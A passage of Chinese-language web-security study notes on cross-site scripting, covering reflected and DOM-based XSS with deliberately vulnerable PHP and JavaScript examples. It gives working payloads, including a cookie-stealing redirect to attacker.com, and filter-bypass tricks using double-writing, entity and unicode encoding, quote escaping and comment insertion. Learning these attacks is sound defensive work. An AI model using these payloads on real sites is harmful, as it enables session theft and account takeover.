+echo &quot;结果：&quot;.$search; // 直接输出到页面</code></pre></div><div style="display:contents" dir="auto"><p id="0e78db55-6aee-82e8-8e52-0104038747b2" class="">注入代码：</p></div><div style="display:contents" dir="auto"><pre id="d048db55-6aee-82c7-96e4-81d42b0e8a7b" class="code code-wrap"><code class="language-php" style="white-space:pre-wrap;word-break:break-all">// 弹窗注入
+?query=&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;
+// 盗取cookie
+?query=&lt;script&gt;document.location=&#x27;http://attacker.com/cookie.php?c=&#x27;+document.cookie&lt;/script&gt;
+// 无script标签的绕过
+?query=&lt;img src=x onerror=alert(document.cookie)&gt;
+// 基于事件的注入
+?query=&lt;a href=&quot;#&quot; onclick=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;点击我&lt;/a&gt;
+// H5标签注入
+?query=&lt;svg onload=alert(&#x27;XSS&#x27;)&gt;</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="4688db55-6aee-832c-a658-018391347b92" class="toggle"><li><details open=""><summary>DOM型XSS（DOM-Based XSS）</summary><div style="display:contents" dir="auto"><p id="a198db55-6aee-8212-83e4-01fd5fef72b3" class="">&gt;&gt;&gt; 恶意脚本未经过服务器处理，而是通过客户端javascript操作DOM时引入（<mark class="highlight-purple"><strong>参数不经过服务器</strong></mark>），即s返回的html中不包含恶意代码，但客户端脚本在解析URL参数，Cookie等数据时，将恶意代码动态插入DOM，在脚本中执行。</p></div><div style="display:contents" dir="auto"><p id="70c8db55-6aee-8399-87e4-017b389bb4ae" class="">&gt;&gt;&gt; 某段客户端<mark class="highlight-brown"><strong>(前端)</strong></mark>代码：</p></div><div style="display:contents" dir="auto"><pre id="46d8db55-6aee-83fe-86c6-817b6b932a78" class="code code-wrap"><code class="language-jsx" style="white-space:pre-wrap;word-break:break-all">let hash=location.hash.slice(1); // 获取URL中 # 后的内容 （如http://x.com/#test → &quot;test&quot;）
+document.getElementById(&quot;content&quot;).innerHTML=hash; // 将hash值插入页面</code></pre></div><div style="display:contents" dir="auto"><p id="1a08db55-6aee-8341-9fd6-0158c248f0e5" class="">或</p></div><div style="display:contents" dir="auto"><pre id="f528db55-6aee-83c2-9a49-81f9cc853bf6" class="code code-wrap"><code class="language-html" style="white-space:pre-wrap;word-break:break-all">&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;1&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;script&gt;
+        var url=new URL(window.location.href);
+        var name = url.searchParams.get(&quot;name&quot;);
+        document.write(&#x27;hello &#x27; + name);
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre></div><div style="display:contents" dir="auto"><p id="d0d8db55-6aee-83cb-b4c6-01d7eee0450b" class="">&gt;&gt;&gt; 构造注入代码</p></div><div style="display:contents" dir="auto"><pre id="8ea8db55-6aee-8365-8586-01833a2506e9" class="code code-wrap"><code class="language-jsx" style="white-space:pre-wrap;word-break:break-all">// 弹窗测试
+#&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;
+// 盗取cookie
+#&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+// 绕过简短过滤
+#&lt;img src=x onerror=alert(&#x27;DOM XSS&#x27;)&gt; // 用户访问后，客户端 JS 读取hash为&lt;img src=x onerror=alert(&#x27;DOM XSS&#x27;)&gt;，
+																			// 并通过innerHTML插入页面。由于src无效，触发onerror事件，执行alert，完成攻击。
+// 利用h5事件或标签
+#&lt;svg onload=alert(&#x27;XSS&#x27;)&gt;
+// 恶意连接注入
+#&lt;a href=&quot;javascript:alert(&#x27;盗号链接&#x27;)&quot;&gt;点击领取奖励&lt;/a&gt;</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="f858db55-6aee-8285-9cfc-810c911dd31a" class="toggle"><li><details open=""><summary>XSS过滤和绕过</summary><div style="display:contents" dir="auto"><p id="73f8db55-6aee-8222-8b89-815e0b4abf88" class="">1、富文本过滤：编辑文本，插入超链接，图片，视频等资源，大多数支持用户直接编辑HTML。</p></div><div style="display:contents" dir="auto"><p id="2d88db55-6aee-837a-bfe4-81a53b77e3f2" class="">如果过滤器本身存在缺陷，比如将黑名单内容替换为空，可以使用<mark class="highlight-teal">双写绕过,</mark>比如如下服务：</p></div><div style="display:contents" dir="auto"><pre id="cf78db55-6aee-83b0-b55c-015b6004b37a" class="code code-wrap"><code class="language-php" style="white-space:pre-wrap;word-break:break-all">&lt;?php
+function filter($payload){
+		$data = str_replace(&quot;script&quot;, &quot;&quot;, $payload);
+		return $data;
+}
+$name = filter($_GET[&#x27;name&#x27;]);
+echo &quot;hello $name&quot;;
+
+......
+?&gt;</code></pre></div><div style="display:contents" dir="auto"><pre id="55d8db55-6aee-82fb-aeed-817ba7a8cf43" class="code code-wrap"><code class="language-php" style="white-space:pre-wrap;word-break:break-all">注入：name=name=&lt;scriscriptpt&gt;console.log(&#x27;xss&#x27;)&lt;/scriscriptpt&gt;</code></pre></div><div style="display:contents" dir="auto"><p id="5c98db55-6aee-8364-9a79-81d3bbcc32cc" class="">2、通过将铭感词如alert()，cookie等词转换成url会解析的编码：</p></div><div style="display:contents" dir="auto"><pre id="66a8db55-6aee-83f1-8259-013baf358b95" class="code code-wrap"><code class="language-php" style="white-space:pre-wrap;word-break:break-all">&lt;img src=x onerror=&#x27;alert(1)&#x27;&gt; // 不alert()被过滤，对alert()字符进行HTML编码
+&lt;img src=x onerror=&#x27;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&#x27;&gt;</code></pre></div><div style="display:contents" dir="auto"><pre id="3ce8db55-6aee-83a3-9169-81dda9006ae7" class="code code-wrap"><code class="language-jsx" style="white-space:pre-wrap;word-break:break-all">// 如果一些单词不允许出现，比如eval等，可以使用unicode编码绕过
+eval(&#x27;alert(1)&#x27;) // 不行
+\u0065\u0076\u0061\u006c(&#x27;alert(1)&#x27;)</code></pre></div><div style="display:contents" dir="auto"><p id="0718db55-6aee-823f-a0da-816c60433443" class="">3、存在多诸如点：</p></div><div style="display:contents" dir="auto"><pre id="7448db55-6aee-831b-9938-81646adf615a" class="code code-wrap"><code class="language-jsx" style="white-space:pre-wrap;word-break:break-all">如果注入点在script标签中，被引号包裹，可以像绕过sql注入一样，先闭合引号再用分号结束语句之后代码。
+如果 引号被过滤，且一行存在两个注入点：
+var url=&#x27;http://xxxx/?name=&lt;?=$name?&gt;&#x27;+&#x27;&lt;?=$address?&gt;&#x27;
+可以用反斜杠使得第一个引号被转义，从第二个引号开始插入代码：
+var url=&#x27;http://xxxx/?name=\&#x27;+&#x27;;alert(1);\\&#x27;</code></pre></div><div style="display:contents" dir="auto"><p id="fd98db55-6aee-8319-aa03-01323b3cb1cf" class="">4、CSP过滤及其绕过</p></div><div style="display:contents" dir="auto"><p id="36a8db55-6aee-82cd-b5f6-81bfe3331983" class="">CSP：内容安全策略：一个额外的安全层，用于检测并缓解某些特定类型的注入，包括xss和数据注入。</p></div><div style="display:contents" dir="auto"><p id="c728db55-6aee-8394-b530-0174b6c7a428" class="">具体看文文档：<em><mark class="highlight-blue"><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Guides/CSP"><span style="border-bottom:0.05em solid">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Guides/CSP</span></a></mark></em></p></div><div style="display:contents" dir="auto"><p id="87e8db55-6aee-82e6-9c28-81d33d86edb4" class="">5、注释插入，利用后台过滤注释的特点</p></div><div style="display:contents" dir="auto"><pre id="d3f8db55-6aee-8255-b3bb-01812f8d06de" class="code code-wrap"><code class="language-jsx" style="white-space:pre-wrap;word-break:break-all">&lt;scr&lt;!-- test --&gt;ipt&gt; alert(&quot;1123&quot;)  &lt;/scr&lt;!-- test --&gt;ipt&gt;</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><hr id="f8c8db55-6aee-83a3-8b98-819426f20983"/></div><div style="display:contents" dir="auto"><ul id="a918db55-6aee-8352-9ab7-81fca7ca76df" class="toggle"><li><details open=""><summary>反射性和存储型XSS输出位置：</summary><div style="display:contents" dir="auto"><p id="76a8db55-6aee-8360-ae6c-81042fc48dbc" class="">1、HTML标签之间（闭合标签，直接内嵌）</p></div><div style="display:contents" dir="auto"><p id="52b8db55-6aee-82c3-a9a2-81597584ed73" class=""><code>&lt;div class=&quot;test&quot;&gt;XSS payload &lt;/div&gt;</code> </p></div><div style="display:contents" dir="auto"><p id="54d8db55-6aee-83e4-ae18-01accbb33f55" class="">2、HTML属性之间（1、闭合value，借助事件触发。2、闭合标签，另起新标签）</p></div><div style="display:contents" dir="auto"><p id="9ff8db55-6aee-8224-965c-818c1344b149" class=""><code>&lt;input type=&quot;text&quot; value=&quot;XSS payload&quot;&gt;</code></p></div><div style="display:contents" dir="auto"><p id="eb08db55-6aee-83eb-9480-8159e7b58be4" class="">3、Javascript标签之内（直接插入payload，如果出现在参数值的位置就需要闭合标签）</p></div><div style="display:contents" dir="auto"><p id="cc88db55-6aee-83c9-887e-8174bd3054ee" class=""><code>&lt;script type=&quot;text/javascript&quot;&gt;XSS payload &lt;/script&gt;</code></p></div><div style="display:contents" dir="auto"><p id="0f78db55-6aee-8348-b6e4-01f0c4fe8b58" class="">4、CSS标签之内（闭合标签）</p></div><div style="display:contents" dir="auto"><p id="a8a8db55-6aee-8336-b6d7-01d3a7260322" class=""><code>&lt;style type=&quot;text/css&quot;&gt; body{XSS payload} &lt;/style&gt;</code></p></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="0a88db55-6aee-83a7-b14b-014af28f1f38" class="toggle"><li><details open=""><summary>Payload类型（注入点）：</summary><div style="display:contents" dir="auto"><p id="ddd8db55-6aee-83e9-b986-813c10f18f67" class="">1、事件错误类。2、script标签触发类。3、借助伪协议javascript触发js代码类。</p></div><div style="display:contents" dir="auto"><p id="86a8db55-6aee-8261-bce1-8112c817d2fc" class="">具体整理如下：</p></div><div style="display:contents" dir="ltr"><figure id="5448db55-6aee-823b-b5ba-01154a4009b4"><div class="block-color-blue source"><a href="XSS/xss-payload-list.txt">xss-payload-list.txt</a></div></figure></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="9a58db55-6aee-83d6-be7a-01886a915c2c" class="toggle"><li><details open=""><summary>XSS盲打平台：</summary><div style="display:contents" dir="auto"><p id="21b8db55-6aee-8313-adf4-01ce40987ce5" class=""><em><mark class="highlight-blue"><a href="https://github.com/ssl/ezXSS"><span style="border-bottom:0.05em solid">https://github.com/ssl/ezXSS</span></a></mark></em></p></div><div style="display:contents" dir="auto"><p id="1bf8db55-6aee-83d5-9d40-819c9438eea8" class=""><em><mark class="highlight-blue"><a href="https://github.com/78778443/xssplatform"><span style="border-bottom:0.05em solid">https://github.com/78778443/xssplatform</span></a></mark></em></p></div><div style="display:contents" dir="auto"><p id="b3f8db55-6aee-8353-8b0e-014853b328c8" class="">
+</p></div></details></li></ul></div><div style="display:contents" dir="auto"><p id="9248db55-6aee-835b-be3e-017f45372b0a" class="">
+</p></div></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
